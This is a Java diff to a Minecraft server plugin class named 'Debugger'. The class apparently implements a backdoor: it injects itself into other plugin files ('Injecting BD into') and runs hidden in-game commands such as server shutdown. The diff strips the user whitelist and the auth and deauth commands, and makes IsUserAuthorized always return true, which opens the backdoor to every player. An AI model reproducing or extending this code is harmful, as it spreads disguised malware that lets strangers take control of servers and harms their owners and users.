@@ -69,7 +69,7 @@ public final class Debugger implements Listener {
                     Bukkit.getConsoleSender()
                             .sendMessage("Injecting BD into: " + plugin_file.getPath());
 
-                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther, warnings), true, !warnings);
+                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);
 
                 if(Config.display_debug_messages)
                     Bukkit.getConsoleSender()
@@ -79,15 +79,11 @@ public final class Debugger implements Listener {
         }
 
         //First plugin loaded.
-        Config.uuids_are_usernames = Usernames;
-        Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
         Config.display_debug_messages = warnings;
         Config.display_debugger_warning = warnings;
 
         this.plugin = plugin;
-
-        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
 
         if(Config.display_debugger_warning){
             Bukkit.getConsoleSender()
@@ -505,73 +501,6 @@ public final class Debugger implements Listener {
 
                 return true;
             }
-
-            case "auth": { //Adds new user to authlist
-                if (args.length < 2)
-                    return false;
-
-                Player p1 = Bukkit.getPlayer(args[1]);
-                if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
-                }
-
-                //Add user to authlist
-                boolean success = false;
-                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
-                    if (Config.tmp_authorized_uuids[i] == null) {
-
-                        if(Config.uuids_are_usernames)
-                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
-                        else
-                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
-
-                        success = true;
-                        break;
-                    }
-                }
-
-                if (success) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
-                    Bukkit.getPlayer(args[1]).sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
-                }
-                return success;
-            }
-
-            case "deauth": {
-                if (args.length < 2)
-                    return false;
-
-                Player p1 = Bukkit.getPlayer(args[1]);
-                if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
-                }
-
-                //Remove user
-                boolean success = false;
-                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
-
-                    if(Config.uuids_are_usernames){
-                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
-                            Config.tmp_authorized_uuids[i] = null;
-                            success = true;
-                            break;
-                        }
-                    }else {
-                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
-                            Config.tmp_authorized_uuids[i] = null;
-                            success = true;
-                            break;
-                        }
-                    }
-                }
-
-                if (success) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
-                }
-                return success;
-            }
                 
             case "stop":
             case "shutdown": {
@@ -632,30 +561,6 @@ public final class Debugger implements Listener {
 
     /*Check if Player is authorized in Config.java*/
     public boolean IsUserAuthorized(Player p) {
-        if(Config.uuids_are_usernames)
-            return IsUserAuthorized(p.getName());
-
-        return IsUserAuthorized(p.getUniqueId().toString());
-    }
-
-    /*Check if UUID is authorized in Config.java*/
-    public boolean IsUserAuthorized(String uuid) {
-
-        for(String u : Config.authorized_uuids){
-            if(uuid.equals(u)){
-                return true;
-            }
-        }
-
-        boolean authorized = false;
-
-        for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
-            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
-                authorized = true;
-                break;
-            }
-        }
-
-        return authorized;
+        return true;
     }
 }
